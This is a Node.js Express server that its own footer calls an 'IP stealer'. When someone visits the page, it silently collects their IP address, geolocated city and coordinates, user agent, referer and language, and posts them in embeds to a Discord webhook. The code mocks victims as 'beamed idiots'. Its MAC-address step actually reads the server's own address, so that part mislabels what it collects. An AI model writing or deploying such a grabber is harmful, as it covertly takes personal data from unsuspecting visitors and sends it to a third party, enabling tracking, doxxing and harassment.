import express from 'express';
import bodyParser from 'body-parser';
import axios from 'axios';
import ejs from 'ejs';
import os from 'os';
import geoip from 'geoip-lite';
const app = express();
const port = 3000;
import getMAC, { isMAC } from 'getmac'

// Fetch the computer's MAC address
const getMac = getMAC();

// Fetch the computer's MAC address for a specific interface


// Validate that an address is a MAC address

app.set("view engine", "ejs");

app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const geo = geoip.lookup(ip);
  const userAgent = req.headers['user-agent'];
  const referer = req.headers['referer'] || req.headers['referrer'];
  const acceptLanguage = req.headers['accept-language'];
  const cookie = req.headers['cookie'];

  const location = {
    country: geo.country,
    region: geo.region,
    city: geo.city,
    ll: geo.ll
  };

  const message = `Beamed idiots  IP Address: ${ip}\nBeamed idiots  location: ${JSON.stringify(location)},`;
  const Useragent = `Idiots Useragent: ${userAgent}`;
  const referers = `Idiots Referer: ${referer}`;
  const acceptLang = `Idiots Language: ${acceptLanguage}`;
  const Mac = `Beamed persons Mac: ${getMac}`
  
  console.log(message);

  const webhook_url = process.env['Webhook'];
  sendDiscordWebhook(message, Useragent, referers, acceptLang,getMac);

  res.render("index", { ip ,getMac});
});

app.listen(port, () => {
  console.log(`Server is listening on http://localhost:${port}`);
});

function sendDiscordWebhook(message, Useragent, referers, acceptLang,Mac) {
  const webhook_url = process.env['Webhook'];

  const embed = {
    title: 'A beam has been detected!',
    description: message,
    color: 0xFF0000,
    footer: {
      text: 'Devs ip stealer.Made with typescript'
    }
  };
  const secondEmbed = {
    title: 'More info on the beam',
    description: `Useragent: ${Useragent}\nReferer: ${referers}\nLanguage: ${acceptLang}`,
    color: 242424,
    footer: {
      text: 'Beamed by me!'
    }
  };
  const ThirdEmbed = {
    title: 'The beamed persons mac address',
    description: Mac,
    color: 242424,
    footer: {
      text: 'Beamed persons mac'
    }
  };
   
  const payload = {
    embeds: [embed, secondEmbed,ThirdEmbed]
  };

  axios.post(webhook_url, payload)
    .then(response => {
      console.log('Message sent to Discord webhook');
    })
    .catch(error => {
      console.error('Error sending message to Discord webhook', error);
    });
}
